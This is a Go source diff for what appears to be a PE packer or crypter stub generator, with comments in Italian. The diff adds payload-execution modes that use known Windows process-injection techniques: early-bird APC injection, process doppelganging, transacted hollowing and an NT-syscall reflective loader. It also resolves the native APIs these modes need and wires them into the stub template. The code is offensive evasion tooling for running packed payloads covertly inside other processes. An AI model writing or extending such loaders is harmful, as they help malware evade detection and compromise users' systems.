@@ -11,6 +11,9 @@ const (
 	peProcessHollowingPlaceholder = "{{PROCESS_HOLLOWING_IMPL}}"
 	peAtomicBombingPlaceholder    = "{{ATOMIC_BOMBING_IMPL}}"
 	peSelfInjectionPlaceholder    = "{{SELF_INJECTION_IMPL}}"
+	peEarlyBirdPlaceholder        = "{{EARLY_BIRD_IMPL}}"
+	peProcessDoppelPlaceholder    = "{{PROCESS_DOPPEL_IMPL}}"
+	peTransactedPlaceholder       = "{{TRANSACTED_HOLLOW_IMPL}}"
 )
 
 // PEStubTemplate contiene il template base per lo stub PE
@@ -63,6 +66,7 @@ var (
 	procGetThreadCtx     = kernel32.NewProc("GetThreadContext")
 	procSetThreadCtx     = kernel32.NewProc("SetThreadContext")
 	procResumeThread     = kernel32.NewProc("ResumeThread")
+	procQueueUserAPC     = kernel32.NewProc("QueueUserAPC")
 	procNtUnmapView      = ntdll.NewProc("NtUnmapViewOfSection")
 	procSetFileAttrs     = kernel32.NewProc("SetFileAttributesW")
 	procMoveFileEx       = kernel32.NewProc("MoveFileExW")
@@ -88,6 +92,12 @@ var (
 	procNtCreateThreadEx        = ntdll.NewProc("NtCreateThreadEx")
 	procNtWaitForSingleObject   = ntdll.NewProc("NtWaitForSingleObject")
 	procNtClose                 = ntdll.NewProc("NtClose")
+	procNtCreateSection         = ntdll.NewProc("NtCreateSection")
+	procNtCreateProcessEx       = ntdll.NewProc("NtCreateProcessEx")
+	procNtMapViewOfSection      = ntdll.NewProc("NtMapViewOfSection")
+	procCreateTransaction       = kernel32.NewProc("CreateTransaction")
+	procCreateFileTransacted    = kernel32.NewProc("CreateFileTransactedW")
+	procRollbackTransaction     = kernel32.NewProc("RollbackTransaction")
 
 	procRegisterClassEx  = user32.NewProc("RegisterClassExW")
 	procCreateWindowEx   = user32.NewProc("CreateWindowExW")
@@ -168,11 +178,19 @@ func main() {
 		executeProcessHollowing(payload)
 	case "atomic_bombing":
 		executeAtomicBombing(payload)
+	case "early_bird":
+		executeEarlyBird(payload)
+	case "early_bird_atomic_bombing":
+		executeEarlyBirdAtomicBombing(payload)
+	case "process_doppelganging":
+		executeProcessDoppelganging(payload)
+	case "transacted_hollowing":
+		executeTransactedHollowing(payload)
 	case "self_injection":
 		executeSelfInjection(payload)
-	case "stealth_loader":
+	case "nt_syscall_reflective":
 		disableStealthGuards()
-		executeStealthLoader(payload)
+		executeNtSyscallReflective(payload)
 	case "reflective_loader":
 		disableStealthGuards()
 		executeReflectiveLoader(payload)
@@ -337,6 +355,9 @@ func trimToOriginal(data []byte, originalSize uint64) []byte {
 
 ` + peProcessHollowingPlaceholder + `
 ` + peAtomicBombingPlaceholder + `
+` + peEarlyBirdPlaceholder + `
+` + peProcessDoppelPlaceholder + `
+` + peTransactedPlaceholder + `
 ` + peSelfInjectionPlaceholder + `
 
 // executeFromTemp esegue il payload da file temporaneo (preferibilmente nella stessa cartella dell'eseguibile impacchettato)
@@ -738,9 +759,10 @@ func isProcessElevated() bool {
 
 // GetPEStubSource ritorna il codice sorgente dello stub PE
 func GetPEStubSource(arch string, mode common.Mode) string {
-	includePH := mode == common.ModeProcessHollowing || mode == common.ModeAtomicBombing
-	includeAtomic := mode == common.ModeAtomicBombing
-	includeSelf := mode == common.ModeSelfInjection || mode == common.ModeStealthLoader || mode == common.ModeReflectiveLoader
+	includePH := mode == common.ModeProcessHollowing || mode == common.ModeAtomicBombing || mode == common.ModeProcessDoppel || mode == common.ModeTransactedHollow || mode == common.ModeEarlyBird || mode == common.ModeEarlyBirdAtomic
+	includeAtomic := mode == common.ModeAtomicBombing || mode == common.ModeEarlyBirdAtomic
+	includeEarly := mode == common.ModeEarlyBird || mode == common.ModeEarlyBirdAtomic
+	includeSelf := mode == common.ModeSelfInjection || mode == common.ModeNtSyscallReflect || mode == common.ModeReflectiveLoader
 
 	var phImpl string
 	if includePH {
@@ -757,7 +779,19 @@ func GetPEStubSource(arch string, mode common.Mode) string {
 	if includeAtomic {
 		atomicImpl = winstrat.AtomicBombingRuntime
 	} else {
-		atomicImpl = "func executeAtomicBombing(payload []byte) { executeProcessHollowing(payload) }\n"
+		atomicImpl = "func executeAtomicBombing(payload []byte) { executeFromTemp(payload) }\n" +
+			"func executeEarlyBirdAtomicBombing(payload []byte) { executeFromTemp(payload) }\n"
+	}
+
+	var earlyImpl string
+	if includeEarly {
+		if arch == "386" {
+			earlyImpl = winstrat.EarlyBirdRuntime32
+		} else {
+			earlyImpl = winstrat.EarlyBirdRuntime64
+		}
+	} else {
+		earlyImpl = "func executeEarlyBird(payload []byte) { executeProcessHollowing(payload) }\n"
 	}
 
 	var selfImpl string
@@ -768,12 +802,37 @@ func GetPEStubSource(arch string, mode common.Mode) string {
 			selfImpl = winstrat.SelfInjectionRuntime64
 		}
 	} else {
-		selfImpl = "func executeSelfInjection(payload []byte) { executeFromTemp(payload) }\nfunc executeStealthLoader(payload []byte) { executeSelfInjection(payload) }\nfunc executeReflectiveLoader(payload []byte) { executeSelfInjection(payload) }\n"
+		selfImpl = "func executeSelfInjection(payload []byte) { executeFromTemp(payload) }\nfunc executeNtSyscallReflective(payload []byte) { executeSelfInjection(payload) }\nfunc executeReflectiveLoader(payload []byte) { executeSelfInjection(payload) }\n"
+	}
+
+	var doppelImpl string
+	if includePH && mode == common.ModeProcessDoppel {
+		if arch == "386" {
+			doppelImpl = winstrat.ProcessDoppelRuntime32
+		} else {
+			doppelImpl = winstrat.ProcessDoppelRuntime
+		}
+	} else {
+		doppelImpl = "func executeProcessDoppelganging(payload []byte) { executeFromTemp(payload) }\n"
+	}
+
+	var transactedImpl string
+	if includePH && mode == common.ModeTransactedHollow {
+		if arch == "386" {
+			transactedImpl = winstrat.TransactedHollowRuntime32
+		} else {
+			transactedImpl = winstrat.TransactedHollowRuntime
+		}
+	} else {
+		transactedImpl = "func executeTransactedHollowing(payload []byte) { executeFromTemp(payload) }\n"
 	}
 
 	replacer := strings.NewReplacer(
 		peProcessHollowingPlaceholder, phImpl,
 		peAtomicBombingPlaceholder, atomicImpl,
+		peEarlyBirdPlaceholder, earlyImpl,
+		peProcessDoppelPlaceholder, doppelImpl,
+		peTransactedPlaceholder, transactedImpl,
 		peSelfInjectionPlaceholder, selfImpl,
 	)
 	return replacer.Replace(PEStubSource)
